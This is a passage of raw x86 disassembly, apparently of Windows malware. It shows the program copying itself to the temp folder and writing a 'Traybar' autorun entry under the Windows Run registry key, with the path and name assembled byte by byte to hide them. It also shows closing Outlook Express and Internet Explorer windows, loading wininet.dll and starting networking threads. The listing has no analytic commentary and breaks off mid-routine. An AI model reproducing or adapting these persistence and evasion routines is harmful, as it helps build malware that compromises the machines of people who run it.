; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_802A21:				; CODE XREF: sub_80299E+73j
		push	eax		; lpBuffer
		push	118h		; nBufferLength
		call	ds:GetTempPathA

loc_802A2D:				; CODE XREF: sub_80299E+81j
		cmp	[ebp+String2], bl
		jz	loc_802AE2
		lea	eax, [ebp+String2]
		push	eax		; lpString
		call	ds:lstrlenA
		lea	ecx, [ebp+String2]
		dec	ecx
		cmp	byte ptr [eax+ecx], 5Ch
		jz	short loc_802A61
		lea	eax, [ebp+String2]
		push	offset String2	; lpString2
		push	eax		; lpString1
		call	esi ; lstrcatA

loc_802A61:				; CODE XREF: sub_80299E+B3j
		lea	eax, [ebp+var_C]
		push	eax		; lpString2
		lea	eax, [ebp+String2]
		push	eax		; lpString1
		call	esi ; lstrcatA
		lea	eax, [ebp+String2]
		push	20h		; dwFileAttributes
		push	eax		; lpFileName
		call	ds:SetFileAttributesA
		push	ebx		; hTemplateFile
		push	80h		; dwFlagsAndAttributes
		push	2		; dwCreationDisposition
		push	ebx		; lpSecurityAttributes
		push	3		; dwShareMode
		lea	eax, [ebp+String2]
		push	40000000h	; dwDesiredAccess
		push	eax		; lpFileName
		call	ds:CreateFileA
		cmp	eax, ebx
		jz	short loc_802AD0
		cmp	eax, 0FFFFFFFFh
		jz	short loc_802AD0
		push	eax		; hObject
		call	ds:CloseHandle
		lea	eax, [ebp+String2]
		push	eax		; lpFileName
		call	ds:DeleteFileA
		lea	eax, [ebp+String2]
		push	ebx		; bFailIfExists
		push	eax		; lpNewFileName
		lea	eax, [ebp+ExistingFileName]
		push	eax		; lpExistingFileName
		call	ds:CopyFileA
		test	eax, eax
		jmp	short loc_802AE0
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_802AD0:				; CODE XREF: sub_80299E+FEj
					; sub_80299E+103j
		lea	eax, [ebp+String2]
		push	eax		; lpFileName
		call	ds:GetFileAttributesA
		cmp	eax, 0FFFFFFFFh

loc_802AE0:				; CODE XREF: sub_80299E+130j
		jnz	short loc_802AF1

loc_802AE2:				; CODE XREF: sub_80299E+95j
		inc	[ebp+arg_0]
		cmp	[ebp+arg_0], 2
		jl	loc_802A08
		jmp	short loc_802AFD
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_802AF1:				; CODE XREF: sub_80299E:loc_802AE0j
		lea	eax, [ebp+String2]
		push	eax		; lpString2
		push	[ebp+lpString1]	; lpString1
		call	edi ; lstrcpyA

loc_802AFD:				; CODE XREF: sub_80299E+151j
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
sub_80299E	endp


;  S U B	R O U T	I N E 

; Attributes: bp-based frame

sub_802B02	proc near		; CODE XREF: sub_802CB2+3Bp

SubKey		= byte ptr -3Ch
var_38		= byte ptr -38h
var_37		= byte ptr -37h
var_36		= byte ptr -36h
var_35		= byte ptr -35h
var_34		= byte ptr -34h
var_33		= byte ptr -33h
var_32		= byte ptr -32h
var_31		= byte ptr -31h
var_30		= byte ptr -30h
var_2F		= byte ptr -2Fh
var_2E		= byte ptr -2Eh
var_2D		= byte ptr -2Dh
var_2C		= byte ptr -2Ch
var_2B		= byte ptr -2Bh
var_2A		= byte ptr -2Ah
var_29		= byte ptr -29h
var_28		= byte ptr -28h
var_27		= byte ptr -27h
var_26		= byte ptr -26h
var_25		= byte ptr -25h
var_24		= byte ptr -24h
var_23		= byte ptr -23h
var_22		= byte ptr -22h
var_21		= byte ptr -21h
var_20		= byte ptr -20h
var_1F		= byte ptr -1Fh
var_1E		= byte ptr -1Eh
var_1D		= byte ptr -1Dh
var_1C		= byte ptr -1Ch
var_1B		= byte ptr -1Bh
var_1A		= byte ptr -1Ah
var_19		= byte ptr -19h
var_18		= byte ptr -18h
var_17		= byte ptr -17h
var_16		= byte ptr -16h
var_15		= byte ptr -15h
var_14		= byte ptr -14h
var_13		= byte ptr -13h
var_12		= byte ptr -12h
var_11		= byte ptr -11h
var_10		= byte ptr -10h
var_F		= byte ptr -0Fh
ValueName	= byte ptr -0Ch
var_A		= byte ptr -0Ah
var_9		= byte ptr -9
var_8		= byte ptr -8
var_7		= byte ptr -7
var_6		= byte ptr -6
var_5		= byte ptr -5
hKey		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 3Ch
		push	ebx
		push	esi
		mov	esi, ds:RegOpenKeyExA
		push	edi
		lea	eax, [ebp+hKey]
		mov	edi, 20006h
		xor	ebx, ebx
		push	eax		; phkResult
		push	edi		; samDesired
		lea	eax, [ebp+SubKey]
		push	ebx		; ulOptions
		push	eax		; lpSubKey
		push	80000002h	; hKey
		mov	[ebp+SubKey], 53h
		mov	byte ptr [ebp-3Bh], 6Fh
		mov	byte ptr [ebp-3Ah], 66h
		mov	byte ptr [ebp-39h], 74h
		mov	[ebp+var_38], 77h
		mov	[ebp+var_37], 61h
		mov	[ebp+var_36], 72h
		mov	[ebp+var_35], 65h
		mov	[ebp+var_34], 5Ch
		mov	[ebp+var_33], 4Dh
		mov	[ebp+var_32], 69h
		mov	[ebp+var_31], 63h
		mov	[ebp+var_30], 72h
		mov	[ebp+var_2F], 6Fh
		mov	[ebp+var_2E], 73h
		mov	[ebp+var_2D], 6Fh
		mov	[ebp+var_2C], 66h
		mov	[ebp+var_2B], 74h
		mov	[ebp+var_2A], 5Ch
		mov	[ebp+var_29], 57h
		mov	[ebp+var_28], 69h
		mov	[ebp+var_27], 6Eh
		mov	[ebp+var_26], 64h
		mov	[ebp+var_25], 6Fh
		mov	[ebp+var_24], 77h
		mov	[ebp+var_23], 73h
		mov	[ebp+var_22], 5Ch
		mov	[ebp+var_21], 43h
		mov	[ebp+var_20], 75h
		mov	[ebp+var_1F], 72h
		mov	[ebp+var_1E], 72h
		mov	[ebp+var_1D], 65h
		mov	[ebp+var_1C], 6Eh
		mov	[ebp+var_1B], 74h
		mov	[ebp+var_1A], 56h
		mov	[ebp+var_19], 65h
		mov	[ebp+var_18], 72h
		mov	[ebp+var_17], 73h
		mov	[ebp+var_16], 69h
		mov	[ebp+var_15], 6Fh
		mov	[ebp+var_14], 6Eh
		mov	[ebp+var_13], 5Ch
		mov	[ebp+var_12], 52h
		mov	[ebp+var_11], 75h
		mov	[ebp+var_10], 6Eh
		mov	[ebp+var_F], bl
		mov	[ebp+ValueName], 54h
		mov	byte ptr [ebp-0Bh], 72h
		mov	[ebp+var_A], 61h
		mov	[ebp+var_9], 79h
		mov	[ebp+var_8], 62h
		mov	[ebp+var_7], 61h
		mov	[ebp+var_6], 72h
		mov	[ebp+var_5], bl
		call	esi ; RegOpenKeyExA
		test	eax, eax
		jz	short loc_802C18
		lea	eax, [ebp+hKey]
		push	eax		; phkResult
		push	edi		; samDesired
		lea	eax, [ebp+SubKey]
		push	ebx		; ulOptions
		push	eax		; lpSubKey
		push	80000001h	; hKey
		call	esi ; RegOpenKeyExA
		test	eax, eax
		jnz	short loc_802C41

loc_802C18:				; CODE XREF: sub_802B02+FFj
		mov	esi, [ebp+arg_0]
		add	esi, 4
		push	esi		; lpString
		call	ds:lstrlenA
		inc	eax
		push	eax		; cbData
		push	esi		; lpData
		push	1		; dwType
		lea	eax, [ebp+ValueName]
		push	ebx		; Reserved
		push	eax		; lpValueName
		push	[ebp+hKey]	; hKey
		call	ds:RegSetValueExA
		push	[ebp+hKey]	; hKey
		call	ds:RegCloseKey

loc_802C41:				; CODE XREF: sub_802B02+114j
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
sub_802B02	endp


;  S U B	R O U T	I N E 


sub_802C46	proc near		; CODE XREF: sub_802C72+11p
					; sub_802C72+21p ...

hWnd		= dword	ptr  0Ch

		push	ebx
		push	edi
		mov	edi, [esp+hWnd]
		xor	ebx, ebx
		cmp	edi, ebx
		jz	short loc_802C6F
		push	esi
		mov	esi, ds:PostMessageA
		push	ebx		; lParam
		push	ebx		; wParam
		push	12h		; Msg
		push	edi		; hWnd
		call	esi ; PostMessageA
		push	ebx		; lParam
		push	ebx		; wParam
		push	10h		; Msg
		push	edi		; hWnd
		call	esi ; PostMessageA
		push	ebx		; lParam
		push	ebx		; wParam
		push	2		; Msg
		push	edi		; hWnd
		call	esi ; PostMessageA
		pop	esi

loc_802C6F:				; CODE XREF: sub_802C46+Aj
		pop	edi
		pop	ebx
		retn
sub_802C46	endp


;  S U B	R O U T	I N E 


; DWORD	__stdcall sub_802C72(LPVOID)
sub_802C72	proc near		; DATA XREF: sub_802CB2+67o
		push	esi
		mov	esi, ds:FindWindowA
		push	0		; lpWindowName
		push	offset ClassName ; lpClassName
		call	esi ; FindWindowA
		push	eax
		call	sub_802C46
		pop	ecx
		push	0		; lpWindowName
		push	offset aAth_note ; lpClassName
		call	esi ; FindWindowA
		push	eax
		call	sub_802C46
		pop	ecx
		push	0		; lpWindowName
		push	offset aIeframe	; lpClassName
		call	esi ; FindWindowA
		push	eax
		call	sub_802C46
		pop	ecx
		push	0		; dwExitCode
		call	ds:ExitThread
		pop	esi
sub_802C72	endp


;  S U B	R O U T	I N E 

; Attributes: bp-based frame

sub_802CB2	proc near		; CODE XREF: start+3Ap

var_C		= dword	ptr -0Ch
ThreadId	= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	ebx
		mov	ebx, [ebp+ThreadId]
		push	esi
		push	ebx		; lpFileName
		call	sub_802790
		mov	dword ptr [esp+0], offset aCS ;	"c:\\s"
		call	ds:GetFileAttributesA
		xor	esi, esi
		cmp	eax, 0FFFFFFFFh
		jz	short loc_802CD6
		mov	[ebx], esi

loc_802CD6:				; CODE XREF: sub_802CB2+20j
		cmp	[ebx], esi
		jnz	short loc_802CE5
		push	ebx
		call	sub_8028E6
		test	eax, eax
		pop	ecx
		jnz	short loc_802D64

loc_802CE5:				; CODE XREF: sub_802CB2+26j
		push	edi
		push	ebx
		call	sub_80299E
		push	ebx
		call	sub_802B02
		pop	ecx
		mov	edi, ds:CreateThread
		pop	ecx
		lea	eax, [ebp+ThreadId]
		push	eax		; lpThreadId
		push	esi		; dwCreationFlags
		push	esi		; lpParameter
		push	offset StartAddress ; lpStartAddress
		push	esi		; dwStackSize
		push	esi		; lpThreadAttributes
		call	edi ; CreateThread
		cmp	[ebx], esi
		mov	ebx, ds:Sleep
		jz	short loc_802D3C
		lea	eax, [ebp+ThreadId]
		push	eax		; lpThreadId
		push	esi		; dwCreationFlags
		push	esi		; lpParameter
		push	offset sub_802C72 ; lpStartAddress
		push	esi		; dwStackSize
		push	esi		; lpThreadAttributes
		call	edi ; CreateThread
		call	sub_802E9C
		movzx	eax, ax
		push	5Ah
		cdq
		pop	ecx
		idiv	ecx
		add	edx, 2Dh
		imul	edx, 3E8h
		push	edx		; dwMilliseconds
		call	ebx ; Sleep

loc_802D3C:				; CODE XREF: sub_802CB2+5Fj
		call	sub_8046A9
		lea	eax, [ebp+ThreadId]
		push	eax		; lpThreadId
		push	esi		; dwCreationFlags
		push	esi		; lpParameter
		push	offset sub_8046BB ; lpStartAddress
		push	esi		; dwStackSize
		push	esi		; lpThreadAttributes
		call	edi ; CreateThread
		call	sub_804BA1
		pop	edi

loc_802D56:				; CODE XREF: sub_802CB2+B0j
		call	sub_805158
		push	1F4h		; dwMilliseconds
		call	ebx ; Sleep
		jmp	short loc_802D56
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_802D64:				; CODE XREF: sub_802CB2+31j
		pop	esi
		pop	ebx
		pop	ebp
		retn
sub_802CB2	endp ; sp =  4


;  S U B	R O U T	I N E 

; Attributes: bp-based frame

		public start
start		proc near

WSAData		= WSAData ptr -298h
var_108		= dword	ptr -108h

		push	ebp
		mov	ebp, esp
		sub	esp, 298h
		lea	eax, [ebp+WSAData]
		push	eax		; lpWSAData
		push	101h		; wVersionRequested
		call	ds:WSAStartup
		call	sub_802E90
		push	108h
		lea	eax, [ebp+var_108]
		push	0
		push	eax
		call	memset
		lea	eax, [ebp+var_108]
		push	eax
		call	sub_802CB2
		add	esp, 10h
		push	0		; uExitCode
		call	ds:ExitProcess
		int	3		; Trap to Debugger
start		endp


;  S U B	R O U T	I N E 


sub_802DB3	proc near		; CODE XREF: sub_805D98+15Ep
					; sub_806125+A2p

var_70		= dword	ptr -70h

		push	ebp
		lea	ebp, [esp+var_70]
		sub	esp, 0C4h
		cmp	dword ptr [ebp+78h], 0
		jnz	short loc_802DD0
		lea	eax, [ebp+60h]
		push	eax		; lpSystemTime
		call	ds:GetLocalTime
		jmp	short loc_802DEB
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_802DD0:				; CODE XREF: sub_802DB3+Fj
		lea	eax, [ebp+58h]
		push	eax		; lpLocalFileTime
		push	dword ptr [ebp+78h] ; lpFileTime
		call	ds:FileTimeToLocalFileTime
		lea	eax, [ebp+60h]
		push	eax		; lpSystemTime
		lea	eax, [ebp+58h]
		push	eax		; lpFileTime
		call	ds:FileTimeToSystemTime

loc_802DEB:				; CODE XREF: sub_802DB3+1Bj
		and	dword ptr [ebp-54h], 0
		lea	eax, [ebp-54h]
		push	eax		; lpTimeZoneInformation
		call	ds:GetTimeZoneInformation
		mov	ecx, [ebp-54h]
		cmp	eax, 2
		jnz	short loc_802E06
		mov	eax, [ebp+54h]
		add	ecx, eax

loc_802E06:				; CODE XREF: sub_802DB3+4Cj
		neg	ecx
		mov	eax, ecx
		jns	short loc_802E0E
		neg	eax

loc_802E0E:				; CODE XREF: sub_802DB3+57j
		cmp	word ptr [ebp+64h], 6
		jbe	short loc_802E1B
		mov	word ptr [ebp+64h], 6

loc_802E1B:				; CODE XREF: sub_802DB3+60j
		cmp	word ptr [ebp+62h], 0
		jnz	short loc_802E28
		mov	word ptr [ebp+62h], 1

loc_802E28:				; CODE XREF: sub_802DB3+6Dj
		cmp	word ptr [ebp+62h], 0Ch
		jbe	short loc_802E35
		mov	word ptr [ebp+62h], 0Ch

loc_802E35:				; CODE XREF: sub_802DB3+7Aj
		push	edi
		push	3Ch
		cdq
		pop	edi
		idiv	edi
		push	edx
		push	eax
		xor	eax, eax
		test	ecx, ecx
		setl	al
		lea	eax, [eax+eax+2Bh]
		push	eax
		movzx	eax, word ptr [ebp+6Ch]
		push	eax
		movzx	eax, word ptr [ebp+6Ah]
		push	eax
		movzx	eax, word ptr [ebp+68h]
		push	eax
		movzx	eax, word ptr [ebp+60h]
		push	eax
		movzx	eax, word ptr [ebp+62h]
		push	ds:dword_8011D8[eax*4]
		movzx	eax, word ptr [ebp+66h]
		push	eax
		movzx	eax, word ptr [ebp+64h]
		push	ds:dword_8011C0[eax*4]
		push	offset aSUSU_2u_2u_2uC ; LPCSTR
		push	dword ptr [ebp+7Ch] ; LPSTR
		call	ds:wsprintfA
		add	esp, 30h
		pop	edi
		add	ebp, 70h
		leave
		retn
sub_802DB3	endp


;  S U B	R O U T	I N E 


sub_802E90	proc near		; CODE XREF: start+1Bp
		call	ds:GetTickCount
		mov	ds:dword_807F20, eax
		retn
sub_802E90	endp


;  S U B	R O U T	I N E 


sub_802E9C	proc near		; CODE XREF: sub_802CB2+70p
					; sub_802EB8p ...
		mov	eax, ds:dword_807F20
		imul	eax, 343FDh
		add	eax, 269EC3h
		mov	ds:dword_807F20, eax
		mov	ax, word ptr ds:dword_807F20+2
		retn
sub_802E9C	endp


;  S U B	R O U T	I N E 


sub_802EB8	proc near		; CODE XREF: sub_804253+29p
					; sub_805575+F8p ...
		call	sub_802E9C
		movzx	ecx, ax
		shl	ecx, 10h
		call	sub_802E9C
		movzx	eax, ax
		xor	eax, ecx
		retn
sub_802EB8	endp


;  S U B	R O U T	I N E 


sub_802ECE	proc near		; CODE XREF: sub_803FD5+65p
					; sub_804059+A1p

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8

		mov	eax, [esp+arg_0]
		push	esi
		jmp	short loc_802EFA
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_802ED5:				; CODE XREF: sub_802ECE+30j
		mov	edx, [esp+4+arg_4]
		mov	esi, eax
		test	cl, cl
		jz	short loc_802EF0

loc_802EDF:				; CODE XREF: sub_802ECE+20j
		mov	cl, [edx]
		test	cl, cl
		jz	short loc_802EF0
		cmp	[esi], cl
		jnz	short loc_802EF0
		inc	esi
		inc	edx
		cmp	byte ptr [esi],	0
		jnz	short loc_802EDF

loc_802EF0:				; CODE XREF: sub_802ECE+Fj
					; sub_802ECE+15j ...
		cmp	esi, edx
		jz	short loc_802F02
		cmp	byte ptr [edx],	0
		jz	short loc_802F02
		inc	eax

loc_802EFA:				; CODE XREF: sub_802ECE+5j
		mov	cl, [eax]
		test	cl, cl
		jnz	short loc_802ED5
		xor	eax, eax

loc_802F02:				; CODE XREF: sub_802ECE+24j
					; sub_802ECE+29j
		pop	esi
		retn
sub_802ECE	endp


;  S U B	R O U T	I N E 


sub_802F04	proc near		; CODE XREF: sub_803B98+4Fp
					; sub_803B98+A4p ...

arg_0		= dword	ptr  4
arg_4		= byte ptr  8

		mov	eax, [esp+arg_0]
		jmp	short loc_802F11
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_802F0A:				; CODE XREF: sub_802F04+11j
		cmp	cl, [esp+arg_4]
		jz	short loc_802F17
		inc	eax

loc_802F11:				; CODE XREF: sub_802F04+4j
		mov	cl, [eax]
		test	cl, cl
		jnz	short loc_802F0A

loc_802F17:				; CODE XREF: sub_802F04+Aj
		mov	cl, [eax]
		sub	cl, [esp+arg_4]
		neg	cl
		sbb	ecx, ecx
		not	ecx
		and	eax, ecx
		retn
sub_802F04	endp


;  S U B	R O U T	I N E 

; Attributes: bp-based frame

sub_802F26	proc near		; CODE XREF: sub_8046C9+56p

var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		push	ecx
		cmp	[ebp+arg_8], 0
		push	ebx
		push	esi
		push	edi
		jz	short loc_802F64
		mov	esi, ds:tolower
		mov	ebx, [ebp+arg_4]

loc_802F3C:				; CODE XREF: sub_802F26+3Cj
		mov	eax, [ebp+arg_0]
		dec	[ebp+arg_8]
		movzx	edi, byte ptr [eax]
		movzx	eax, byte ptr [ebx]
		push	eax		; int
		call	esi ; tolower
		push	edi		; int
		mov	[ebp+var_4], eax
		call	esi ; tolower
		pop	ecx
		inc	ebx
		inc	[ebp+arg_0]
		pop	ecx
		mov	ecx, [ebp+var_4]
		cmp	eax, ecx
		jnz	short loc_802F6B
		cmp	[ebp+arg_8], 0
		jnz	short loc_802F3C

loc_802F64:				; CODE XREF: sub_802F26+Bj
		xor	eax, eax

loc_802F66:				; CODE XREF: sub_802F26+48j
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_802F6B:				; CODE XREF: sub_802F26+36j
		xor	eax, eax
		inc	eax
		jmp	short loc_802F66
sub_802F26	endp


;  S U B	R O U T	I N E 

; Attributes: bp-based frame

sub_802F70	proc near		; CODE XREF: sub_804059+7Dp

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		cmp	[ebp+arg_8], 0
		jnz	short loc_802F7D
		xor	eax, eax
		pop	ebp
		retn
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_802F7D:				; CODE XREF: sub_802F70+7j
		mov	ecx, [ebp+arg_0]
		mov	edx, [ebp+arg_4]

loc_802F83:				; CODE XREF: sub_802F70+24j
		dec	[ebp+arg_8]
		jz	short loc_802F96
		mov	al, [ecx]
		test	al, al
		jz	short loc_802F96
		cmp	al, [edx]
		jnz	short loc_802F96
		inc	ecx
		inc	edx
		jmp	short loc_802F83
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_802F96:				; CODE XREF: sub_802F70+16j
					; sub_802F70+1Cj ...
		movzx	eax, byte ptr [ecx]
		movzx	ecx, byte ptr [edx]
		sub	eax, ecx
		pop	ebp
		retn
sub_802F70	endp


;  S U B	R O U T	I N E 

; Attributes: bp-based frame

sub_802FA0	proc near		; CODE XREF: sub_8046C9+CDp

String		= byte ptr -24h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4
WideCharStr	= word ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 24h
		push	esi
		push	edi
		mov	edi, dword ptr [ebp+WideCharStr]
		xor	esi, esi
		mov	[ebp+var_8], esi
		cmp	byte ptr [edi],	0
		jz	loc_803101
		push	ebx

loc_802FBA:				; CODE XREF: sub_802FA0+15Aj
		cmp	byte ptr [esi+edi], 26h
		jnz	loc_8030F5
		mov	[ebp+var_4], esi
		inc	esi
		cmp	byte ptr [esi+edi], 23h
		jnz	loc_8030F5
		xor	ebx, ebx
		inc	esi

loc_802FD5:				; CODE XREF: sub_802FA0+51j
		movsx	eax, byte ptr [esi+edi]
		push	eax		; int
		call	ds:isdigit
		test	eax, eax
		pop	ecx
		jz	short loc_802FF3
		mov	al, [esi+edi]
		mov	[ebp+ebx+String], al
		inc	ebx
		inc	esi
		cmp	ebx, 0Fh
		jb	short loc_802FD5

loc_802FF3:				; CODE XREF: sub_802FA0+43j
		and	[ebp+ebx+String], 0
		xor	ecx, ecx
		cmp	[ebp+String], cl
		mov	dword ptr [ebp+WideCharStr], ecx
		jz	short loc_803018
		lea	eax, [ebp+String]

loc_803005:				; CODE XREF: sub_802FA0+73j
		movsx	edx, byte ptr [eax]
		inc	eax
		lea	ecx, [ecx+ecx*4]
		cmp	byte ptr [eax],	0
		lea	ecx, [edx+ecx*2-30h]
		jnz	short loc_803005
		mov	dword ptr [ebp+WideCharStr], ecx

loc_803018:				; CODE XREF: sub_802FA0+60j
		cmp	byte ptr [esi+edi], 3Bh
		jnz	short loc_80301F
		inc	esi

loc_80301F:				; CODE XREF: sub_802FA0+7Cj
		test	ecx, ecx
		jle	loc_8030F5
		xor	ebx, ebx
		push	14h
		lea	eax, [ebp+String]
		push	ebx
		push	eax
		call	memset
		mov	eax, dword ptr [ebp+WideCharStr]
		add	esp, 0Ch
		cmp	eax, 100h
		jge	short loc_80304A
		and	[ebp-23h], bl
		mov	[ebp+String], al
		jmp	short loc_803060
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_80304A:				; CODE XREF: sub_802FA0+A0j
		push	ebx		; lpUsedDefaultChar
		push	ebx		; lpDefaultChar
		lea	eax, [ebp+String]
		push	14h		; cchMultiByte
		push	eax		; lpMultiByteStr
		lea	eax, [ebp+WideCharStr]
		push	1		; cchWideChar
		push	eax		; lpWideCharStr
		push	ebx		; dwFlags
		push	ebx		; CodePage
		call	ds:WideCharToMultiByte

loc_803060:				; CODE XREF: sub_802FA0+A8j
		cmp	[ebp+String], 0
		jz	loc_8030F5
		mov	ebx, [ebp+var_4]
		lea	eax, [ebp+String]
		sub	esi, ebx
		push	eax		; lpString
		mov	[ebp+var_C], esi
		call	ds:lstrlenA
		cmp	esi, eax
		mov	[ebp+var_10], eax
		jz	short loc_8030D4
		mov	ecx, [ebp+var_4]
		add	esi, ebx
		push	edi		; lpString
		lea	ebx, [esi+edi]
		lea	esi, [eax+ecx]
		add	esi, edi
		call	ds:lstrlenA
		mov	ecx, edi
		sub	ecx, ebx
		cmp	esi, ebx
		lea	ecx, [eax+ecx+1]
		jnb	short loc_8030BE
		xor	esi, esi
		test	ecx, ecx
		jle	short loc_8030D4
		mov	eax, ebx
		sub	eax, [ebp+var_C]
		add	eax, [ebp+var_10]

loc_8030B1:				; CODE XREF: sub_802FA0+11Aj
		mov	dl, [ebx+esi]
		mov	[eax], dl
		inc	eax
		inc	esi
		cmp	esi, ecx
		jl	short loc_8030B1
		jmp	short loc_8030D4
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_8030BE:				; CODE XREF: sub_802FA0+101j
		lea	eax, [ecx-1]
		test	eax, eax
		jl	short loc_8030D4
		lea	ecx, [esi+eax]
		sub	ebx, esi
		inc	eax

loc_8030CB:				; CODE XREF: sub_802FA0+132j
		mov	dl, [ebx+ecx]
		mov	[ecx], dl
		dec	ecx
		dec	eax
		jnz	short loc_8030CB

loc_8030D4:				; CODE XREF: sub_802FA0+E1j
					; sub_802FA0+107j ...
		lea	eax, [ebp+String]
		push	eax		; lpString
		call	ds:lstrlenA
		mov	esi, [ebp+var_4]
		push	eax
		lea	eax, [ebp+String]
		push	eax
		lea	eax, [esi+edi]
		push	eax
		call	memcpy
		add	esp, 0Ch
		inc	[ebp+var_8]

loc_8030F5:				; CODE XREF: sub_802FA0+1Ej
					; sub_802FA0+2Cj ...
		inc	esi
		cmp	byte ptr [esi+edi], 0
		jnz	loc_802FBA
		pop	ebx

loc_803101:				; CODE XREF: sub_802FA0+13j
		mov	eax, [ebp+var_8]
		pop	edi
		pop	esi
		leave
		retn
sub_802FA0	endp


;  S U B	R O U T	I N E 

; Attributes: bp-based frame

sub_803108	proc near		; CODE XREF: sub_804578:loc_80459Cp
					; sub_807A7B+77p ...

LibFileName	= byte ptr -10h
var_C		= byte ptr -0Ch
var_B		= byte ptr -0Bh
var_A		= byte ptr -0Ah
var_9		= byte ptr -9
var_8		= byte ptr -8
var_7		= byte ptr -7
var_6		= byte ptr -6
var_5		= byte ptr -5
var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		sub	esp, 10h
		and	[ebp+var_5], 0
		lea	eax, [ebp+LibFileName]
		push	eax		; lpModuleName
		mov	[ebp+LibFileName], 77h
		mov	byte ptr [ebp-0Fh], 69h
		mov	byte ptr [ebp-0Eh], 6Eh
		mov	byte ptr [ebp-0Dh], 69h
		mov	[ebp+var_C], 6Eh
		mov	[ebp+var_B], 65h
		mov	[ebp+var_A], 74h
		mov	[ebp+var_9], 2Eh
		mov	[ebp+var_8], 64h
		mov	[ebp+var_7], 6Ch
		mov	[ebp+var_6], 6Ch
		call	ds:GetModuleHandleA
		test	eax, eax
		jnz	short loc_80315A
		lea	eax, [ebp+LibFileName]
		push	eax		; lpLibFileName
		call	ds:LoadLibraryA
		test	eax, eax
		jz	short loc_80316A

loc_80315A:				; CODE XREF: sub_803108+42j
		push	offset ProcName	; lpProcName
		push	eax		; hModule
		call	ds:GetProcAddress
		test	eax, eax
		jnz	short loc_80316F

loc_80316A:				; CODE XREF: sub_803108+50j
		push	2
		pop	eax
		leave
		retn
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_80316F:				; CODE XREF: sub_803108+60j
		lea	ecx, [ebp+var_4]
		push	0
		push	ecx
		call	eax
		neg	eax
